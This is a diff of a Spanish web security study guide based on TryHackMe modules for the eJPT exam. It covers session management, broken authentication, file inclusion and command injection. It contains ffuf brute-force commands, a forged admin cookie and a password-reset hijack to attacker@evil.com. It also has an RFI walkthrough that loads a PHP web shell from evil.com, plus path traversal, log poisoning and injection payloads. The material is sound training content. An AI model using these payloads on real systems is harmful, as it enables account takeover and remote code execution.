@@ -1,29 +1,23 @@
-# 🛡️ GUÍA COMPLETA DE SEGURIDAD WEB: SESIONES, AUTENTICACIÓN, INCLUSIÓN, COMANDOS Y APIS
+<h1>
+  <img src="https://cdn-images.tryhackme.com/modules/web-application-vulnerabilities-ii-1778910839802.svg" width="70px" align="absmiddle">
+  <span> WEB APPLICATION VULNERABILITIES II</span>
+</h1>
 
 ---
 
-> **Estructura y Propósito del Manual:** Este manual reúne y desarrolla exhaustivamente el contenido técnico de los cinco módulos seleccionados de TryHackMe y Notion en estricto orden cronológico. El objetivo de este documento es servir como guía de consulta directa y completa para exámenes de certificación (como eJPT) y auditorías web reales. Todo el contenido está redactado en texto continuo explicativo, detallando conceptos, vectores de ataque, comandos, payloads, análisis de código vulnerable, evasión de filtros y procedimientos de remediación.
+> Este módulo lleva su piratería web más allá de los clásicos a las vulnerabilidades que convierten pequeños descuidos en compromisos de sistema completo. Comenzará con la mecánica de la gestión y autenticación de sesiones, luego pasará a los ataques del lado del servidor, como el recorrido de directorios y la inyección de comandos, y terminará con la superficie de ataque en rápida expansión de las API modernas. Un desafío de seguridad en vivo cierra el módulo, por lo que las técnicas se prueban en batalla antes de llevarlas al resto de la ruta.
 
 ---
 
-## 🚀 Matriz de Consulta Rápida (Cheat Sheet de Seguridad Web)
-
-| Vulnerabilidad | Vector / Dónde Buscar | Payload / Comando / Prueba Rápida | Indicador de Éxito / Respuesta Esperada |
-| :--- | :--- | :--- | :--- |
-| **Gestión de Sesiones** | Cookies HTTP, LocalStorage, Tokens JWT | Modificación de rol en cookie/token, reuso de cookie tras logout | Acceso mantenido tras cierre de sesión o elevación de perfil en cliente |
-| **Autenticación Rota** | Formularios de login, registro, recuperación | `ffuf -w users.txt:W1 -w pass.txt:W2 -d "user=W1&pass=W2" -fc 200` | Respuesta HTTP 302 o código de estado diferente al fallo general |
-| **Inclusión de Archivos (LFI)** | Parámetros URL (`?page=`, `?lang=`) | `../../../../etc/passwd` o `....//....//etc/passwd` | Visualización del contenido del archivo `/etc/passwd` en pantalla |
-| **Inclusión Remota (RFI)** | Parámetros URL con `allow_url_fopen` | `http://attacker.com/shell.txt` | Ejecución de código PHP alojado en el servidor externo del auditor |
-| **Inyección de Comandos** | Parámetros pasados a comandos del SO | `; whoami` o `; ping -c 10 127.0.0.1` | Impresión del usuario ejecutante o retardo medible de 10 segundos |
-| **Pentesting de APIs (BOLA)** | Endpoints REST (`/v1/users/10/orders`) | Cambiar ID de recurso en la URL (`/v1/users/1/orders`) | Devuelve datos de otro usuario con código HTTP 200 OK en lugar de 403 |
-| **Asignación Masiva (API)** | Peticiones JSON POST/PUT/PATCH | Inyectar `"role": "admin"` o `"is_admin": true` en el JSON | El objeto se actualiza con los permisos elevados inyectados |
-
----
-
-## 1. Gestión de Sesiones (Session Management)
+<h2>
+  <img src="https://cdn-images.tryhackme.com/room-icons/6093e17fa004d20049b6933e-1722528947776" width="60px" align="absmiddle">
+  <span> Gestión de Sesiones (Session Management)</span>
+</h2>
 
 ### 1.1 Introducción y Conceptos de Gestión de Sesiones
 La gestión de sesiones es el mecanismo fundamental mediante el cual una aplicación web mantiene el estado de un usuario a lo largo de sus interacciones. Dado que el protocolo HTTP es inherentemente sin estado, cada petición que realiza un cliente es independiente de la anterior. En lugar de exigir que el usuario introduzca su nombre de usuario y contraseña en cada interacción, la aplicación emite un identificador de sesión único tras una autenticación exitosa. Este identificador se transmite en cada solicitud subsiguiente para que el servidor reconozca quién realiza la acción y determine sus permisos asociados. Si la gestión de sesiones está mal implementada, un atacante puede predecir, interceptar o manipular este identificador y secuestrar la cuenta de la víctima.
+
+<br>
 
 ### 1.2 Ciclo de Vida de la Gestión de Sesiones
 El ciclo de vida de una sesión abarca cuatro fases consecutivas: creación, seguimiento, expiración y terminación. 
@@ -36,6 +30,8 @@ La fase de expiración de la sesión aborda el problema de la desconexión pasiv
 
 La fase de terminación de la sesión ocurre cuando el usuario hace clic de manera explícita en el botón de cierre de sesión. En este momento, la aplicación debe invalidar completamente el identificador en el almacenamiento del servidor. Eliminar la cookie únicamente en el navegador del cliente es insuficiente, ya que si el servidor no destruye el registro interno, la cookie capturada previamente por un atacante seguirá siendo válida indefinidamente.
 
+<br>
+
 ### 1.3 Modelo IAAA: Identificación, Autenticación, Autorización y Responsabilidad
 Para comprender la seguridad en la gestión de sesiones es imprescindible distinguir los cuatro pilares del modelo IAAA.
 
@@ -47,6 +43,8 @@ La autorización es el proceso mediante el cual el sistema verifica si la sesió
 
 La responsabilidad o rendición de cuentas (Accountability) consiste en registrar y auditar las acciones realizadas por cada sesión. En caso de un incidente de seguridad, los registros de auditoría vinculados al identificador de sesión permiten reconstruir la secuencia exacta de eventos e identificar la cuenta comprometida.
 
+<br>
+
 ### 1.4 Comparativa Técnica: Cookies frente a Tokens
 Existen dos enfoques principales para implementar el seguimiento de sesiones en arquitectura web: la gestión basada en cookies y la gestión basada en tokens.
 
@@ -54,28 +52,45 @@ La gestión basada en cookies representa el método tradicional. El servidor env
 
 La gestión basada en tokens es el estándar en aplicaciones web modernas y arquitecturas desacopladas (SPA y APIs). Tras la autenticación, el servidor devuelve un token en el cuerpo de la respuesta JSON (comúnmente un JSON Web Token o JWT). El código JavaScript del cliente recibe el token y lo almacena manualmente en el `LocalStorage` o `SessionStorage` del navegador. En cada petición posterior, el script carga el token y lo añade explícitamente en el encabezado `Authorization: Bearer <TOKEN>`. La ventaja principal de los tokens es que eliminan los ataques CSRF tradicionales, ya que el navegador no añade el encabezado de forma automática. Sin embargo, como los tokens almacenados en `LocalStorage` son totalmente accesibles desde JavaScript, cualquier vulnerabilidad XSS permite a un atacante leer el token directamente e impersonar al usuario de forma inmediata.
 
+<br>
+
 ### 1.5 Aseguramiento del Ciclo de Vida y Vulnerabilidades Comunes
 Durante la fase de creación de la sesión, las vulnerabilidades surgen al utilizar algoritmos de generación débiles o predecibles, como codificar simplemente el nombre de usuario en Base64 o utilizar marcas de tiempo secuenciales. Otra falla crítica es la fijación de sesión (Session Fixation), que ocurre cuando la aplicación asigna una cookie de sesión a un usuario anónimo y no la renueva tras un inicio de sesión exitoso. Si un atacante induce a la víctima a usar un identificador conocido antes de autenticarse, mantendrá acceso a la cuenta una vez que la víctima introduzca sus credenciales. Asimismo, en arquitecturas de Inicio de Sesión Único (SSO), las redirecciones no seguras tras la autenticación pueden filtrar el token de sesión hacia servidores de terceros controlados por atacantes.
 
 Durante la fase de seguimiento, las fallas de autorización permiten la escalada vertical (ejecutar funciones administrativas desde una cuenta estándar) y la escalada horizontal (acceder a datos de otros usuarios con el mismo nivel de privilegios). En la expiración y terminación, los problemas provienen de establecer tiempos de vida excesivamente largos o descuidar la invalidación del lado del servidor al cerrar sesión o restablecer la contraseña, lo que otorga acceso persistente a los atacantes que hayan capturado previamente la sesión.
 
+<br>
+
 ### 1.6 Práctica Operativa de Auditoría de Sesiones
 Para auditar la gestión de sesiones en una aplicación web, se debe inspeccionar el tráfico con las herramientas de desarrollador del navegador o Burp Suite. Primero se verifica si la aplicación emite cookies antes del login y si la cookie cambia tras autenticarse (prueba de fijación de sesión). A continuación, se examinan las banderas `HttpOnly`, `Secure` y `SameSite` en la pestaña de almacenamiento de cookies. Posteriormente, se prueba la terminación de sesión copiando el valor de la cookie, cerrando sesión en la aplicación web, y realizando una nueva petición HTTP pegando manualmente la cookie antigua en el encabezado `Cookie`. Si el servidor devuelve una respuesta 200 OK con contenido privado en lugar de redirigir al login, la sesión no fue invalidada en el backend.
 
+<br>
+
 ---
 
-## 2. Autenticación Rota (Broken Authentication)
+<br>
+
+<h2>
+  <img src="https://cdn-images.tryhackme.com/room-icons/645b19f5d5848d004ab9c9e2-1779264024237" width="60px" align="absmiddle">
+  <span> Autenticación Rota (Broken Authentication)</span>
+</h2>
 
 ### 2.1 Introducción y Concepto
 La autenticación rota agrupa las vulnerabilidades que permiten a un atacante anular o eludir los mecanismos de verificación de identidad de una aplicación web, logrando acceder a cuentas de otros usuarios sin conocer sus credenciales legítimas. Estas fallas surgen cuando los desarrolladores asumen que los usuarios interactuarán con la aplicación únicamente de la forma prevista gráfica o cuando la lógica del backend confía en datos enviados por el cliente sin una validación independiente en el servidor.
+
+<br>
 
 ### 2.2 Tipos Principales de Bypasses de Autenticación
 Los ataques contra los sistemas de autenticación se dividen en cuatro categorías fundamentales: enumeración de nombres de usuario, fuerza bruta de credenciales, fallos lógicos en los flujos de recuperación y manipulación directa de cookies de sesión.
 
 La enumeración de nombres de usuario busca construir una lista confirmada de cuentas existentes en el objetivo. La fuerza bruta utiliza dicha lista para probar sistemáticamente diccionarios de contraseñas. Los fallos lógicos explotan inconsistencias en procesos como el restablecimiento de clave para redirigir los enlaces de recuperación. La manipulación de cookies altera los valores de estado almacenados en el navegador cuando el servidor no valida su integridad criptográfica.
 
+<br>
+
 ### 2.3 Impacto Operativo y Casos de Uso
 El impacto de comprometer la autenticación depende de la cuenta accedida. El acceso a una cuenta de cliente permite la exfiltración de datos personales, historial financiero y modificación de perfil. El acceso a una cuenta administrativa otorga el control total sobre la aplicación, permitiendo alterar bases de datos, subir archivos maliciosos y lograr la ejecución remota de código (RCE). Además, las credenciales obtenidas se utilizan habitualmente en ataques de relleno de credenciales (Credential Stuffing) contra otros servicios de Internet donde los usuarios reutilizan la misma contraseña.
+
+<br>
 
 ### 2.4 Enumeración de Nombres de Usuario
 La enumeración es posible cuando la aplicación trata de manera diferente las solicitudes enviadas con nombres de usuario registrados en comparación con los no registrados. El vector más común se encuentra en los formularios de registro o inicio de sesión que devuelven mensajes de error explícitos, como "El nombre de usuario ya está registrado" frente a "Registro exitoso".
@@ -90,6 +105,8 @@ ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d "user
 
 Los usuarios identificados se guardan en un archivo `valid_usernames.txt` para alimentar la siguiente fase del ataque.
 
+<br>
+
 ### 2.5 Fuerza Bruta en Formularios de Login
 Con una lista reducida de usuarios válidos, la fuerza bruta se vuelve altamente eficiente. En lugar de probar miles de usuarios desconocidos, se prueban combinaciones de los usuarios confirmados contra un diccionario de contraseñas habituales (como `rockyou.txt`).
 
@@ -98,6 +115,8 @@ Para ejecutar un ataque de fuerza bruta cruzando dos diccionarios independientes
 ```bash
 ffuf -w valid_usernames.txt:W1 -w /usr/share/wordlists/rockyou.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.10.10/login -fc 200
 ```
+
+<br>
 
 ### 2.6 Fallos Lógicos en la Autenticación
 Los fallos lógicos se producen por incoherencias entre componentes de la aplicación. Un ejemplo clásico es la discrepancia en la comparación de rutas. Si el enrutador del servidor web no distingue entre mayúsculas y minúsculas y dirige `/adMin` al mismo controlador que `/admin`, pero el filtro de seguridad realiza una comparación de cadenas estricta sensible a mayúsculas (`=== '/admin'`), la petición a `/adMin` eludirá la comprobación de seguridad y entregará el panel administrativo sin autenticación.
@@ -114,6 +133,8 @@ email=attacker@evil.com&username=victim
 
 Si la lógica de verificación valida la existencia de la cuenta leyendo el parámetro de la URL, pero genera y envía el correo con el token de recuperación leyendo el parámetro del cuerpo POST, el enlace de restablecimiento de la cuenta de la víctima será enviado directamente a la bandeja de entrada del atacante.
 
+<br>
+
 ### 2.7 Manipulación de Cookies de Sesión
 Cuando el estado de autenticación se almacena en cookies no firmadas criptográficamente, el cliente puede editar su contenido para alterar las decisiones del servidor.
 
@@ -123,17 +144,28 @@ En las cookies basadas en hashes, el servidor almacena el hash de un valor conoc
 
 En las cookies codificadas (como Base64), los datos estructurados JSON suelen estar traducidos para viajar por HTTP. Al recibir la cookie `eyJpZCI6MiwgImFkbWluIjpmYWxzZX0=`, su decodificación revela `{"id":2, "admin":false}`. El atacante puede modificar la cadena JSON a `{"id":2, "admin":true}`, codificarla nuevamente en Base64 (`eyJpZCI6MiwgImFkbWluIjp0cnVlfQ==`) y enviarla en el encabezado `Cookie` para asumir privilegios elevados.
 
+<br>
+
 ---
 
-## 3. Inclusión de Archivos (File Inclusion - LFI / RFI)
+<br>
+
+<h2>
+  <img src="https://cdn-images.tryhackme.com/room-icons/5e2656cb5a909ddf63395dd7e7a377ad.png" width="60px" align="absmiddle">
+  <span> Inclusión de Archivos (File Inclusion - LFI / RFI)</span>
+</h2>
 
 ### 3.1 Introducción y Riesgos Operativos
 Las vulnerabilidades de inclusión de archivos ocurren cuando una aplicación web utiliza entradas proporcionadas por el usuario para construir rutas hacia archivos que deben ser cargados o procesados por el servidor, sin realizar la validación ni el saneamiento adecuado. Estas fallas se encuadran en el OWASP Top 10 bajo control de acceso roto (A01), inyección (A03) y configuraciones de seguridad erróneas (A05). Los riesgos varían desde la lectura no autorizada de código fuente y archivos sensibles del sistema hasta la ejecución remota de código (RCE) completa sobre el servidor backend.
+
+<br>
 
 ### 3.2 Salto de Directorio (Path Traversal / Directory Traversal)
 El salto de directorio es una vulnerabilidad que permite a un atacante navegar a través de la estructura del sistema de archivos del servidor para leer archivos ubicados fuera del directorio raíz web de la aplicación. Ocurre cuando la entrada del usuario se pasa directamente a funciones de lectura de archivos como `file_get_contents()` en PHP. La secuencia `../` (dos puntos y una barra) le indica al sistema operativo que ascienda un nivel en el árbol de directorios. Al concatenar múltiples secuencias `../../../../`, el atacante escapa del directorio de la aplicación web y alcanza la raíz `/` del sistema de archivos, pudiendo descender hacia archivos del sistema como `/etc/passwd`. En sistemas Windows, la sintaxis utiliza la barra invertida `..\..` o la barra diagonal, permitiendo alcanzar la raíz de la unidad `C:\` para leer archivos del sistema como `C:oot.ini` o `C:\Windows\win.ini`.
 
 Entre los archivos objetivo más críticos para auditar mediante Path Traversal destacan el archivo `/etc/passwd` para la lista de usuarios del sistema, `/etc/shadow` para hashes de contraseñas de usuarios con privilegios elevados, `/etc/issue` y `/proc/version` para información del sistema operativo y versión del kernel, `/root/.ssh/id_rsa` para claves privadas SSH de acceso directo, y los archivos `/var/log/apache2/access.log` o `/var/log/nginx/access.log` para registros del servidor web útiles en ataques de Log Poisoning.
+
+<br>
 
 ### 3.3 Inclusión de Archivos Locales (LFI - Local File Inclusion)
 A diferencia del Path Traversal donde el archivo únicamente se lee y se devuelve como texto plano, en la Inclusión de Archivos Locales (LFI) el archivo seleccionado es procesado e interpretado por el lenguaje de programación del servidor a través de funciones como `include()`, `require()`, `include_once()` o `require_once()` en PHP. Esto significa que si el archivo incluido contiene código ejecutable (como etiquetas PHP `<?php ... ?>`), el servidor lo ejecutará antes de enviar la respuesta al cliente.
@@ -141,6 +173,8 @@ A diferencia del Path Traversal donde el archivo únicamente se lee y se devuelv
 En el primer escenario de LFI sin directorio prefijado en el código fuente (`include($_GET['page']);`), la aplicación no añade ninguna ruta estática. El atacante puede proporcionar directamente una ruta absoluta hacia cualquier archivo del sistema, como `http://target.com/index.php?page=/etc/passwd`, logrando que la función procese y muestre el archivo.
 
 En el segundo escenario de LFI con directorio prefijado en el código fuente (`include("languages/" . $_GET['lang']);`), el desarrollador intenta restringir la carga al directorio `languages/`. Sin embargo, el atacante puede inyectar secuencias de salto de directorio en el parámetro para salir de dicha carpeta, como `http://target.com/index.php?lang=../../../../etc/passwd`. El servidor resolverá la ruta interna como `languages/../../../../etc/passwd`, la cual navega fuera de la carpeta y accede exitosamente al archivo objetivo.
+
+<br>
 
 ### 3.4 Pruebas de Caja Negra y Bypasses de Filtros en LFI
 Durante auditorías de caja negra sin acceso al código fuente, los mensajes de error devueltos por la aplicación revelan la estructura interna. Un mensaje como `Warning: include(languages/test.php): failed to open stream` revela que la aplicación agrega el prefijo `languages/` y la extensión `.php` a la entrada.
@@ -153,15 +187,28 @@ Si la defensa aplicada consiste en eliminar la secuencia `../` de la entrada med
 
 Si el servidor exige obligatoriamente que la entrada comience con un prefijo de directorio específico (por ejemplo, validar que el parámetro empiece por `languages/`), el atacante incluye dicho prefijo al inicio del payload y añade inmediatamente las secuencias de salto: `http://target.com/index.php?lang=languages/../../../../etc/passwd`.
 
+<br>
+
 ### 3.5 Inclusión de Archivos Remotos (RFI - Remote File Inclusion)
 La Inclusión de Archivos Remotos (RFI) ocurre cuando la función de inclusión de la aplicación acepta direcciones URL completas que apuntan a servidores externos. En lugar de procesar un archivo alojado localmente en el servidor víctima, la aplicación realiza una petición HTTP saliente hacia un servidor controlado por el atacante, descarga el archivo malicioso y ejecuta su código en el backend. Para que RFI sea explotable en PHP, la configuración del archivo `php.ini` debe tener habilitada la directiva `allow_url_fopen` (y en versiones antiguas `allow_url_include`).
 
 El flujo operativo de un ataque RFI comienza cuando el atacante aloja un archivo ejecutable malicioso como `cmd.txt` en su propio servidor web con contenido tipo `<?php system($_GET['cmd']); ?>`. A continuación, el atacante envía una petición HTTP inyectando la URL completa en el parámetro vulnerable: `GET /index.php?page=http://evil.com/cmd.txt&cmd=id`. El servidor víctima recibe la petición, realiza una solicitud GET hacia `evil.com/cmd.txt`, descarga el código PHP y lo ejecuta inmediatamente en el intérprete del servidor, devolviendo al atacante el resultado de la ejecución del comando `id`.
 
+<br>
+
 ### 3.6 Metodología de Auditoría para File Inclusion
 Para auditar vulnerabilidades de inclusión de archivos en una aplicación web se debe seguir una metodología ordenada. En primer lugar, se identifican todos los parámetros de entrada que acepten nombres de archivos o rutas en URLs, cuerpos POST, cookies y encabezados HTTP. En segundo lugar, se analiza el comportamiento normal enviando valores válidos y registrando la respuesta devuelta. En tercer lugar, se inyectan caracteres especiales y secuencias de salto (`../`, `..\`, `/etc/passwd`) observando los mensajes de error técnicos devueltos. En cuarto lugar, se identifican los filtros aplicados como adición de extensiones, eliminación de caracteres o prefijos obligatorios. En quinto lugar, se construye el payload específico aplicando las técnicas de evasión correspondientes como duplicación de secuencias, byte nulo o agregado de `/.`. Finalmente, en caso de confirmar LFI, se prueban técnicas de escalada a RCE como Log Poisoning (inyectando código PHP en el encabezado `User-Agent` y cargando los archivos de registro de Apache/Nginx) o uso de envoltorios PHP como `php://filter` para leer código fuente en Base64 o `php://input` para enviar código en el cuerpo POST.
 
+<br>
+
 ---
+
+<br>
+
+<h2>
+  <img src="https://cdn-images.tryhackme.com/room-icons/5e2656cb5a909ddf63395dd7e7a377ad.png" width="60px" align="absmiddle">
+  <span> Inclusión de Archivos (File Inclusion - LFI / RFI)</span>
+</h2>
 
 ## 4. Inyección de Comandos (Command Injection)
 
